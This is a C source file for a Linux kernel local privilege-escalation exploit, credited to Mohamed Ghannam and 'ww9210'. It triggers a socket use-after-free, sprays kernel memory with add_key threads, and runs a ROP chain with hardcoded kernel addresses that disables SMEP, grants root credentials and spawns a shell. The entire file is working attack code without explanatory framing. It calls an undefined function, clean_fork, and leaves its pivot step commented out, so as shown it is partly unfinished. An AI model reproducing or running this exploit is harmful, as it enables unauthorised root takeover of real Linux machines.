/*
#######   CREDITS  ############
Mohamed Ghannam
*/
/*
 * exploit written by ww9210
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>

#define PAD_NUM 3
#define THREADS_NUM 2400
#define SOL_DCCP 269
#define COMMIT_CREDS		0xffffffff8107b2e0
#define PREPARE_KERNEL_CRED	0xffffffff8107b690
#define native_write_cr4 0xffffffff81048ac0//native_write_rc4+1
#define poprdiret 0xffffffff810b2747
#define swapgs 0xffffffff81048b84
#define iretq 0xffffffff81021cf6
#define stack_pivot_gadget 0xffffffff816dc1e8
#define stack_top_offset 0
#define krop_base_to_map 0x816dc000
#define CRASH_ADDR 0xffffffffdeadbeef
int rop_start= 0x1e8;
void* krop_base_mapped;

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
void get_root_payload(void) {
		commit_creds(prepare_kernel_cred(0));
}


int fd1,fd2;
struct sockaddr_in6 in1,in2;

char *addr;
void padding()
{
	int fd[PAD_NUM];
	int i;
	for(i=0;i<PAD_NUM;i++){
		fd[i] = socket(0xa,6,0);
	}
}
volatile int do_spray=1;
void *kmalloc()
{
	while(do_spray){
		syscall(__NR_add_key, "user", "wtf", addr, 16, -2);
	}
}
void spray()
{
	pthread_t th[THREADS_NUM];
	int i;
	for(i=0;i<THREADS_NUM;i++)
	if(pthread_create(&th[i], NULL, kmalloc, (void*) NULL) != 0){
		fprintf(stderr, "couldn't create thread\n");
		exit(1);
	}
}
int do_uaf()
{
    struct sockaddr_in6 cin1,cin2;
	int ret;

    fd1 = socket(0xa,6,0);
	if(fd1<0){
		perror("socket");
	}

    memset(&in1,0,sizeof(in1));
    in1.sin6_family = AF_INET6;
    in1.sin6_addr = in6addr_loopback;
    in1.sin6_port = 0x214e;//htons(0x1000);
    ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
	if(ret<0){
		perror("bind");
	}

    ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
    ret=listen(fd1,0x1);
	if(ret<0){
		perror("listen");
	}

    fd2 = socket(0xa,6,0);
	if(fd2<0){
		perror("socket");
	}

    memset(&cin1,0,sizeof(cin1));
    cin1.sin6_family = AF_INET6;
    cin1.sin6_addr = in6addr_loopback;
    cin1.sin6_port = 0x214e;//htons(0x1000);
    cin1.sin6_flowinfo = 0;
    ret=connect(fd2,(struct sockaddr*)&cin1,sizeof(cin1));
	if(fd2<0){
		perror("socket");
	}


    memset(&cin2,0,sizeof(cin2));
    ret=connect(fd1,(struct sockaddr*)&cin2,sizeof(cin2));
	if(ret<0){
		perror("connect");
	}
    memset(&in2,0,sizeof(in2));

    in2.sin6_family = AF_INET6;
    in2.sin6_addr = in6addr_loopback;
    //in2.sin6_port = htons(0x2000);
    in2.sin6_port = htons(0x6f0);
    in2.sin6_flowinfo = 0x2;
    in2.sin6_scope_id = 6;
    ret=bind(fd2,(struct sockaddr*)&in2,sizeof(in2));
	if(ret<0){
		perror("bind");
	}

    struct sockaddr_in6 cin3;
    memset(&cin3,0,sizeof(cin3));
    ret=connect(fd2,(struct sockaddr*)&cin3,sizeof(cin3));
	if(ret<0){
		perror("connect");
	}


    ret=listen(fd2,0xb1);
	if(ret<0){
		perror("listen");
	}

    struct sockaddr_in6 cin4;
    memset(&cin4,0,sizeof(cin4));
    cin4.sin6_family = AF_INET6;
    //cin4.sin6_port = htons(0x2000);//htons(0x3000);
    cin4.sin6_port = htons(0x6f0);//htons(0x3000);
    memset(&cin4.sin6_addr,0,sizeof(struct in6_addr));
    cin4.sin6_flowinfo = 1;
    cin4.sin6_scope_id = 0x32f1;
    ret=connect(fd1,(struct sockaddr*)&cin4,sizeof(cin4));
	if(ret<0){
		perror("connect");
	}
    return fd2;
}

void * alloc_umem(void *addr,size_t size)
{

    addr = mmap((void*)0x100000000,4096,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(addr == (char *)-1) {
        perror("mmap");
        return NULL;
    }
    return addr;
}

void get_shell()
{
	do_spray=0;
	puts("win!");
	sleep(1);
	pid_t pid;
	pid =clean_fork();
	if(pid==0){
    	char *shell = "/bin/sh";
    	char *args[] = {shell, NULL};
    	execve(shell, args, NULL);
	}
	else{
		pause();
	}
}
unsigned long rop_chain[] = {
    poprdiret,
    0x6f0,
    native_write_cr4,
    (unsigned long)&get_root_payload,
    swapgs,
    0, //dummy
    iretq,
    (unsigned long)&get_shell,
    0,//user_cs,
    0,//user_rflags,
    0,//krop_base_mapped + 0x4000,
    0//user_ss
};
void prepare_krop(){
    krop_base_mapped=mmap((void *)krop_base_to_map-0x1000,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (krop_base_mapped<0){
        perror("mmap failed");
    }

	memset(krop_base_mapped,'\xc3',0x8000);
	rop_chain[8]=user_cs;
	rop_chain[9]=user_rflags;
	rop_chain[10]=(unsigned long)krop_base_mapped + 0x4000;
	rop_chain[11]=user_ss;

    memcpy(krop_base_to_map+rop_start, rop_chain, sizeof(rop_chain));
    puts("rop_payload_initialized");
}
int main(void)
{
    addr = (char *)alloc_umem((void*)0x100000000,4096);
    if(addr == NULL)
        exit(0);
    memset(addr,0xcc,4096);

	save_state();
	prepare_krop();

	//*(unsigned long*)addr    = stack_pivot_gadget;
	*(unsigned long*)addr    = CRASH_ADDR;

	int t  = *(int*)&get_root_payload;
	padding();
	int val = 0x4142;
	socklen_t l=sizeof(val);

	spray();
	usleep(200000);

    do_uaf();

    // syscall that dereference the dangling pointer
	int err=0;
	err=getsockopt(fd2, SOL_DCCP, 130, (void*)0x41424344, &l);

	do_spray=0;
	puts("shell...please");
	//sleep(4);
	sleep(2);
	//pause();
    return 0;
}
